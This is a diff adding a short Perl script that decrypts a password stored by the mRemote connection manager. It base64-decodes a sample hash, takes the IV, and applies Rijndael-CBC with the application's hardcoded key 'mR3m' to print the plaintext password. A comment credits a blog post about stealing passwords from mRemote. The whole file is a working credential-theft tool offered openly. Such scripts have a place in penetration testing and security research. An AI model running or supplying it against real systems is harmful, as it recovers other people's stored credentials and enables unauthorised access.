@@ -1,0 +1,37 @@
+#!/usr/bin/env perl
+
+use strict;
+use Crypt::CBC;
+use MIME::Base64;
+
+# Passwd hash to decrypt
+my $passwd_hash = '28kQ15DF4kdW34Mx2+fh+NWZODNSoSPek7ug+ILvyPE=';
+
+# Ecryption key
+my $key = 'mR3m';
+
+# Base64 decode the passwd_hash
+my $passwd_decoded64 = decode_base64($passwd_hash);
+
+# Get first 16 Bytes for IV and rest for Cipher
+my $iv = substr $passwd_decoded64, 0, 16;
+my $cipher_text = substr $passwd_decoded64, 16;
+
+# Instantiate decrypter
+my $cipher = Crypt::CBC->new(
+        {
+                    'key'         => $key,
+                            'cipher'      => 'Rijndael',
+                                    'iv'          => $iv,
+                                            'header'      => 'none',
+                                                    'keysize'     => 128/8
+                                                            }
+                                                            );
+
+# Decrypt passwd
+my $passwd_text = $cipher->decrypt($cipher_text);
+
+# Print to screen
+print "$passwd_text\n";
+
+# Thanks to http://cosine-security.blogspot.pt/2011/06/stealing-password-from-mremote.html
